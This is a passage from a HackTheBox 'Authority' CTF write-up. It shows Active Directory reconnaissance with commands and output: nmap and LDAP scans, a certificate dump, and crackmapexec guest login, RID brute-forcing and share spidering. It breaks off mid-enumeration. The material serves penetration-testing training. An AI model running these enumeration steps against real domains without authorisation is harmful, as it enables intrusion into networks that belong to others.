# CTF Penetration Testing

## Platform: HackTheBox

### Machine: [Authority](https://www.hackthebox.com/machines/Authority)

<img src="https://labs.hackthebox.com/storage/avatars/5ca8f0c721a9eca6f1aeb9ff4b4bac60.png" alt="Authority Machine Logo" width="150"/>

- Machine type: <img src="https://hackmyvm.eu/img/windows.png" alt="Windows" width="17"/> Windows
- Machine difficulty: 🟨 Medium (<span style="color:#f4b03b;">5.4</span>)

> Authority is a medium-difficulty Windows machine that highlights the dangers of misconfigurations, password reuse, storing credentials on shares, and demonstrates how default settings in Active Directory (such as the ability for all domain users to add up to 10 computers to the domain) can be combined with other issues (vulnerable AD CS certificate templates) to take over a domain.

#### Skills Required

- Domain Controller Enumeration
- Solid Understanding of Active Directory Concepts
- Active Directory Enumeration

#### Skills learned

- [Cracking Ansible vaults](https://exploit-notes.hdks.org/exploit/cryptography/algorithm/ansible-vault-secret/)
- Enumerating & Exploiting AD CS
- [Pass-the-Cert attack](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate)
- [ESC1 attack](https://www.crowe.com/cybersecurity-watch/exploiting-ad-cs-a-quick-look-at-esc1-esc8)

#### Tools Used

- ansible2john
- ansible-vault
- Certify.exe
- certipy-ad
- crackmapexec
- evil-winrm
- hashcat
- impacket-addcomputer
- impacket-getST
- impacket-psexec
- impacket-secretsdump
- ldapsearch
- netcat
- netexec
- nmap
- openssl
- passthecert.py
- smbclient

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig tun0`:
```
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.22  netmask 255.255.254.0  destination 10.10.14.22
        inet6 fe80::5fd8:8317:9b00:f158  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef:2::1014  prefixlen 64  scopeid 0x0<global>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 21813  bytes 17364125 (16.5 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 23617  bytes 19254213 (18.3 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping 10.10.11.222`:
```
10.10.11.222 is alive ←
```

`sudo nmap -Pn -sSV -p- -T5 10.10.11.222`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-06 19:21 CET
Warning: 10.10.11.222 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.11.222
Host is up (0.057s latency).
Not shown: 65486 closed tcp ports (reset)
PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Microsoft IIS httpd 10.0 ←
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-06 22:31:26Z) ←
135/tcp   open     msrpc         Microsoft Windows RPC ←
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn ←
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name) ←
445/tcp   open     microsoft-ds? ←
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name) ←
1117/tcp  filtered ardus-mtrns
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
3714/tcp  filtered delos-dms
4600/tcp  filtered piranha1
5680/tcp  filtered canna
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) ←
8443/tcp  open     ssl/https-alt ←
9144/tcp  filtered unknown
9389/tcp  open     mc-nmf        .NET Message Framing
13962/tcp filtered unknown
16712/tcp filtered unknown
19742/tcp filtered unknown
21913/tcp filtered unknown
27331/tcp filtered unknown
28802/tcp filtered unknown
33321/tcp filtered unknown
33378/tcp filtered unknown
34062/tcp filtered unknown
38241/tcp filtered unknown
43728/tcp filtered unknown
44438/tcp filtered unknown
46663/tcp filtered unknown
47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open     msrpc         Microsoft Windows RPC
49665/tcp open     msrpc         Microsoft Windows RPC
49666/tcp open     msrpc         Microsoft Windows RPC
49667/tcp open     msrpc         Microsoft Windows RPC
49673/tcp open     msrpc         Microsoft Windows RPC
49690/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49691/tcp open     msrpc         Microsoft Windows RPC
49693/tcp open     msrpc         Microsoft Windows RPC
49694/tcp open     msrpc         Microsoft Windows RPC
49697/tcp open     msrpc         Microsoft Windows RPC
49708/tcp open     msrpc         Microsoft Windows RPC
49731/tcp filtered unknown
59164/tcp filtered unknown
63325/tcp open     msrpc         Microsoft Windows RPC
63338/tcp open     msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.94SVN%T=SSL%I=7%D=11/6%Time=672BB5F0%P=x86_64-pc-linux
SF:-gnu%r(GetRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/htm
SF:l;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Wed,\x2006\x2
SF:0Nov\x202024\x2022:31:33\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\n\n
SF:\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;URL='/pwm'
SF:\"/></head></html>")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\x
SF:20GET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:\x2
SF:0Wed,\x2006\x20Nov\x202024\x2022:31:33\x20GMT\r\nConnection:\x20close\r
SF:\n\r\n")%r(FourOhFourRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\
SF:x20text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20We
SF:d,\x2006\x20Nov\x202024\x2022:31:33\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n\n\n\n\n\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0
SF:;URL='/pwm'\"/></head></html>")%r(RTSPRequest,82C,"HTTP/1\.1\x20400\x20
SF:\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en
SF:\r\nContent-Length:\x201936\r\nDate:\x20Wed,\x2006\x20Nov\x202024\x2022
SF::31:39\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x2
SF:0lang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\
SF:x20Request</title><style\x20type=\"text/css\">body\x20{font-family:Taho
SF:ma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;backgro
SF:und-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px
SF:;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:
SF:black;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}
SF:</style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x
SF:20Request</h1><hr\x20class=\"line\"\x20/><p><b>Type</b>\x20Exception\x2
SF:0Report</p><p><b>Message</b>\x20Invalid\x20character\x20found\x20in\x20
SF:the\x20HTTP\x20protocol\x20\[RTSP&#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]</p><
SF:p><b>Description</b>\x20The\x20server\x20cannot\x20or\x20will\x20not\x2
SF:0process\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20p
SF:erceived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed\
SF:x20request\x20syntax,\x20invalid\x20");
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows ←

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 620.86 seconds
```

`sudo nmap -Pn -sS --script=ldap-rootdse -p389 10.10.11.222`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-06 19:28 CET
Nmap scan report for 10.10.11.222
Host is up (0.056s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7 ←
|       forestFunctionality: 7 ←
|       domainControllerFunctionality: 7 ←
|       rootDomainNamingContext: DC=authority,DC=htb
|       ldapServiceName: authority.htb:authority$@AUTHORITY.HTB
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=authority,DC=htb
|       serverName: CN=AUTHORITY,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=authority,DC=htb
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=authority,DC=htb
|       namingContexts: DC=authority,DC=htb
|       namingContexts: CN=Configuration,DC=authority,DC=htb
|       namingContexts: CN=Schema,CN=Configuration,DC=authority,DC=htb
|       namingContexts: DC=DomainDnsZones,DC=authority,DC=htb
|       namingContexts: DC=ForestDnsZones,DC=authority,DC=htb
|       isSynchronized: TRUE
|       highestCommittedUSN: 262359
|       dsServiceName: CN=NTDS Settings,CN=AUTHORITY,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=authority,DC=htb
|       dnsHostName: authority.authority.htb ←
|       defaultNamingContext: DC=authority,DC=htb
|       currentTime: 20241106222835.0Z
|_      configurationNamingContext: CN=Configuration,DC=authority,DC=htb
Service Info: Host: AUTHORITY; OS: Windows

Nmap done: 1 IP address (1 host up) scanned in 0.51 seconds
```

`echo -e '10.10.11.222\tauthority.authority.htb authority.htb authority' | sudo tee -a /etc/hosts`:
```
10.10.11.222    authority.authority.htb authority.htb authority ←
```

`ldapsearch -x -H ldap://10.10.11.222/ -s 'base' 'namingContexts'`:
```
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingContexts 
#

#
dn:
namingContexts: DC=authority,DC=htb
namingContexts: CN=Configuration,DC=authority,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=authority,DC=htb
namingContexts: DC=DomainDnsZones,DC=authority,DC=htb
namingContexts: DC=ForestDnsZones,DC=authority,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

`ldapsearch -x -H ldap://10.10.11.222/ -b "DC=authority,DC=htb" '(objectClass=*)'`:
```
# extended LDIF
#
# LDAPv3
# base <DC=authority,DC=htb> with scope subtree
# filter: (objectClass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090ACD, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```
❌

`sudo nmap -sSV --script ssl-cert -p636,3269 10.10.11.222`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-06 19:32 CET
Nmap scan report for authority.authority.htb (10.10.11.222)
Host is up (0.061s latency).

PORT     STATE SERVICE  VERSION
636/tcp  open  ssl/ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA ←
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
|_SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
3269/tcp open  ssl/ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA ←
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
|_SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.89 seconds
```

`openssl s_client -showcerts -connect 10.10.11.222:3269 | openssl x509 -noout -text`:
```
Connecting to 10.10.11.222
Can't use SSL_get_servername
depth=0 
verify error:num=20:unable to get local issuer certificate
verify return:1
depth=0 
verify error:num=21:unable to verify the first certificate
verify return:1
depth=0 
verify error:num=10:certificate has expired
notAfter=Aug  9 23:13:21 2024 GMT
verify return:1
depth=0 
notAfter=Aug  9 23:13:21 2024 GMT
verify return:1
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            3d:00:00:00:03:6d:e7:58:54:e4:dd:36:e2:00:00:00:00:00:03
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: DC=corp, DC=htb, CN=htb-AUTHORITY-CA
        Validity
            Not Before: Aug  9 23:03:21 2022 GMT
            Not After : Aug  9 23:13:21 2024 GMT
        Subject: 
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:d5:b0:92:f4:69:ed:27:f0:bd:04:83:90:40:1e:
                    2f:13:9b:39:9b:7b:e9:08:b1:73:3a:35:9b:c0:ba:
                    a1:a0:52:c5:8d:ce:c4:f8:24:d5:ac:66:aa:d1:a0:
                    73:2b:fa:43:02:e2:4a:57:e1:0b:8e:1d:37:bb:e2:
                    2c:81:f1:3b:ee:72:0b:f0:c4:a1:22:f6:e6:65:e8:
                    2e:6e:9e:fd:d6:34:58:59:f4:aa:13:38:29:e8:db:
                    a6:9d:c6:a2:8f:6f:34:b9:29:0b:64:64:2b:d0:7e:
                    a4:0a:38:c2:f4:0e:ec:c0:f3:a9:30:87:8b:98:d1:
                    28:d5:47:e6:e2:46:3e:08:92:4a:24:5a:b3:c3:5b:
                    3c:e8:c3:48:02:a4:ee:47:35:c2:8f:85:24:e5:90:
                    07:dd:99:d4:11:3e:39:17:42:ad:e1:d9:09:df:60:
                    0c:0e:30:6a:06:78:28:80:d7:08:48:a3:f7:6f:14:
                    1e:93:f4:ac:78:55:d7:30:8b:a1:e4:83:80:b0:99:
                    b4:85:08:71:9b:78:d1:ad:30:67:96:c3:fb:36:e1:
                    05:99:e8:9b:b7:27:bb:8a:17:10:d7:a1:60:4d:2e:
                    2e:13:1c:be:f6:77:5f:23:71:bf:a2:e2:36:25:41:
                    0f:5b:c4:c7:c8:cd:64:11:ba:bd:50:5e:f6:af:98:
                    83:39
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            Microsoft certificate template: 
                0..&+.....7.........i.......G.....~...q..^..d...
            X509v3 Extended Key Usage: 
                Signing KDC Response, Microsoft Smartcard Login, TLS Web Server Authentication, TLS Web Client Authentication
            X509v3 Key Usage: critical
                Digital Signature, Key Encipherment
            Microsoft Application Policies Extension: 
                010...+......0..
+.....7...0
..+.......0
..+.......
            X509v3 Subject Key Identifier: 
                C4:E2:82:86:73:72:6F:B5:CB:62:8B:70:3F:A7:27:AF:A4:80:4C:FD
            X509v3 Authority Key Identifier: 
                2B:CE:64:FA:15:CC:66:92:84:3C:52:7F:A2:3E:E1:29:09:86:0F:7D
            X509v3 CRL Distribution Points: 
                Full Name:
                  URI:ldap:///CN=htb-AUTHORITY-CA,CN=authority,CN=CDP,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=htb,DC=corp?certificateRevocationList?base?objectClass=cRLDistributionPoint
            Authority Information Access: 
                CA Issuers - URI:ldap:///CN=htb-AUTHORITY-CA,CN=AIA,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=htb,DC=corp?cACertificate?base?objectClass=certificationAuthority
            X509v3 Subject Alternative Name: critical
                othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        87:f0:ee:a5:f2:94:6c:03:fa:72:28:ab:12:4a:48:9e:f2:28:
        c3:84:20:68:ce:83:ae:1e:29:68:0b:af:78:c6:fb:38:d7:0f:
        d8:be:3f:59:d2:82:e2:22:4a:e8:48:53:d4:3d:30:d9:38:5a:
        8e:2e:e1:52:0d:b9:c3:36:d2:9a:9b:37:db:49:f2:51:af:8a:
        e3:dc:5d:eb:ed:2d:f0:c0:ad:fc:12:59:28:0f:c4:5b:a8:38:
        82:1d:a9:fe:d9:b4:9f:ee:89:41:d4:07:52:fb:18:69:f4:86:
        6f:05:66:4e:95:3d:31:5e:3a:f9:a6:d2:19:11:14:91:4d:11:
        3c:ab:27:97:ef:e2:38:86:9b:c6:4c:18:e1:bd:d6:f9:2c:e9:
        c6:ee:ca:5c:ec:5e:d4:1e:4e:fd:67:e0:b7:05:61:b5:f6:dc:
        92:e1:fc:3b:ff:d8:e6:da:95:b4:31:a8:f5:60:49:d7:ed:fa:
        db:62:d6:25:3b:b8:90:dc:a7:83:c3:53:d2:08:c8:4c:96:2a:
        68:bd:b0:a9:30:9d:58:39:7f:72:79:08:2f:bd:c8:34:13:4a:
        fc:b9:0b:87:9b:03:53:80:3e:5d:51:6b:87:b4:3b:ff:a0:6e:
        e3:eb:71:ae:4c:dc:04:7d:98:6d:cd:1d:ab:9c:df:55:7f:62:
        07:f5:96:a5

read:errno=104
```

Enumerating SMB we see non-standard shares, such as `Department Shares` and `Development`, and others that are standard on a Domain Controller, such as `NETLOGON` and `SYSVOL`.

`crackmapexec smb 10.10.11.222`:
```
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) ←
```

`crackmapexec smb 10.10.11.222 -u '' -p ''`:
```
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\: ←
```

`crackmapexec smb 10.10.11.222 -u '' -p '' --shares`:
```
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\: 
SMB         10.10.11.222    445    AUTHORITY        [-] Error enumerating shares: STATUS_ACCESS_DENIED ←
```
❌

`crackmapexec smb 10.10.11.222 -u 'guest' -p ''`:
```
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\guest: ←
```

`crackmapexec smb 10.10.11.222 -u 'guest' -p '' --users`:
```
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\guest: 
SMB         10.10.11.222    445    AUTHORITY        [*] Trying to dump local users with SAMRPC protocol
```
❌

`crackmapexec smb 10.10.11.222 -u 'guest' -p '' --rid-brute`:
```
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\guest: 
SMB         10.10.11.222    445    AUTHORITY        498: HTB\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.222    445    AUTHORITY        500: HTB\Administrator (SidTypeUser)
SMB         10.10.11.222    445    AUTHORITY        501: HTB\Guest (SidTypeUser)
SMB         10.10.11.222    445    AUTHORITY        502: HTB\krbtgt (SidTypeUser)
SMB         10.10.11.222    445    AUTHORITY        512: HTB\Domain Admins (SidTypeGroup)
SMB         10.10.11.222    445    AUTHORITY        513: HTB\Domain Users (SidTypeGroup)
SMB         10.10.11.222    445    AUTHORITY        514: HTB\Domain Guests (SidTypeGroup)
SMB         10.10.11.222    445    AUTHORITY        515: HTB\Domain Computers (SidTypeGroup)
SMB         10.10.11.222    445    AUTHORITY        516: HTB\Domain Controllers (SidTypeGroup)
SMB         10.10.11.222    445    AUTHORITY        517: HTB\Cert Publishers (SidTypeAlias)
SMB         10.10.11.222    445    AUTHORITY        518: HTB\Schema Admins (SidTypeGroup)
SMB         10.10.11.222    445    AUTHORITY        519: HTB\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.222    445    AUTHORITY        520: HTB\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.222    445    AUTHORITY        521: HTB\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.222    445    AUTHORITY        522: HTB\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.222    445    AUTHORITY        525: HTB\Protected Users (SidTypeGroup)
SMB         10.10.11.222    445    AUTHORITY        526: HTB\Key Admins (SidTypeGroup)
SMB         10.10.11.222    445    AUTHORITY        527: HTB\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.222    445    AUTHORITY        553: HTB\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.222    445    AUTHORITY        571: HTB\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.222    445    AUTHORITY        572: HTB\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.222    445    AUTHORITY        1000: HTB\AUTHORITY$ (SidTypeUser)
SMB         10.10.11.222    445    AUTHORITY        1101: HTB\DnsAdmins (SidTypeAlias)
SMB         10.10.11.222    445    AUTHORITY        1102: HTB\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.222    445    AUTHORITY        1601: HTB\svc_ldap (SidTypeUser) ←
```

`crackmapexec smb 10.10.11.222 -u 'guest' -p '' --shares`:
```
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\guest: 
SMB         10.10.11.222    445    AUTHORITY        [*] Enumerated shares
SMB         10.10.11.222    445    AUTHORITY        Share           Permissions     Remark
SMB         10.10.11.222    445    AUTHORITY        -----           -----------     ------
SMB         10.10.11.222    445    AUTHORITY        ADMIN$                          Remote Admin
SMB         10.10.11.222    445    AUTHORITY        C$                              Default share
SMB         10.10.11.222    445    AUTHORITY        Department Shares                 
SMB         10.10.11.222    445    AUTHORITY        Development     READ ←           
SMB         10.10.11.222    445    AUTHORITY        IPC$            READ            Remote IPC
SMB         10.10.11.222    445    AUTHORITY        NETLOGON                        Logon server share 
SMB         10.10.11.222    445    AUTHORITY        SYSVOL                          Logon server share
```

`smbclient -U 'guest' --no-pass //10.10.11.222/Development`:
```
session setup failed: NT_STATUS_LOGON_FAILURE
```
❌

`smbclient -U 'guest%' //10.10.11.222/Development`:
```
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Mar 17 14:20:38 2023
  ..                                  D        0  Fri Mar 17 14:20:38 2023
  Automation                          D        0  Fri Mar 17 14:20:40 2023

                5888511 blocks of size 4096. 1401249 blocks available
smb: \> cd ./Automation/Ansible/
smb: \Automation\Ansible\> dir
  .                                   D        0  Fri Mar 17 14:20:50 2023
  ..                                  D        0  Fri Mar 17 14:20:50 2023
  ADCS                                D        0  Fri Mar 17 14:20:48 2023
  LDAP                                D        0  Fri Mar 17 14:20:48 2023
  PWM                                 D        0  Fri Mar 17 14:20:48 2023
  SHARE                               D        0  Fri Mar 17 14:20:48 2023

                5888511 blocks of size 4096. 1405210 blocks available
```

`crackmapexec smb 10.10.11.222 -u 'guest' -p '' --shares -M spider_plus`:
```
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\guest: 
SPIDER_P... 10.10.11.222    445    AUTHORITY        [*] Started module spidering_plus with the following options:
SPIDER_P... 10.10.11.222    445    AUTHORITY        [*]  DOWNLOAD_FLAG: False
SPIDER_P... 10.10.11.222    445    AUTHORITY        [*]     STATS_FLAG: True
SPIDER_P... 10.10.11.222    445    AUTHORITY        [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_P... 10.10.11.222    445    AUTHORITY        [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_P... 10.10.11.222    445    AUTHORITY        [*]  MAX_FILE_SIZE: 50 KB
SPIDER_P... 10.10.11.222    445    AUTHORITY        [*]  OUTPUT_FOLDER: /tmp/cme_spider_plus ←
SPIDER_P... 10.10.11.222    445    AUTHORITY        [+] Saved share-file metadata to "/tmp/cme_spider_plus/10.10.11.222.json". ←
SPIDER_P... 10.10.11.222    445    AUTHORITY        [*] SMB Shares:           7 (ADMIN$, C$, Department Shares, Development, IPC$, NETLOGON, SYSVOL)
SPIDER_P... 10.10.11.222    445    AUTHORITY        [*] SMB Readable Shares:  2 (Development, IPC$) ←
SPIDER_P... 10.10.11.222    445    AUTHORITY        [*] SMB Filtered Shares:  1
SPIDER_P... 10.10.11.222    445    AUTHORITY        [*] Total folders found:  27
SPIDER_P... 10.10.11.222    445    AUTHORITY        [*] Total files found:    52
SPIDER_P... 10.10.11.222    445    AUTHORITY        [*] File size average:    1.5 KB
SPIDER_P... 10.10.11.222    445    AUTHORITY        [*] File size min:        4 B
SPIDER_P... 10.10.11.222    445    AUTHORITY        [*] File size max:        11.1 KB
```

`cat /tmp/cme_spider_plus/10.10.11.222.json`:
```json
